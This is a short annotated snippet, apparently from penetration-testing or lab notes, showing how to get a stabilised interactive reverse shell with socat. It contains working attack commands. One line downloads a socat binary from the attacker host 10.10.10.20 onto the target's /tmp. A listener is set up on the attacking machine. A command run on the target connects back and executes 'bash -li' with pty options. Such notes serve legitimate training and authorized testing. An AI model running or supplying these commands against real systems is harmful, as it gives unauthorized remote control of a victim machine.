# use the non-interactive shell to download socat binary
wget 10.10.10.20/socat -O /tmp/socat

# setup a new listener on the attacking machine
# "echo=0" argument is equivalent to using the "stty raw -echo; fg" trick
socat tcp-l:8080 file:'tty',raw,echo=0

# connect to the listener from the target machine
# - pty:    allocates a pseudoterminal on the target -- part of the stabilisation process
# - stderr: makes sure that any error messages get shown in the shell
# - sigint: passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
# - setsid: creates the process in a new session
# - sane:   stabilises the terminal, attempting to "normalise" it.
socat tcp:10.10.10.20:8080 exec:"bash -li",pty,stderr,sigint,setsid,sane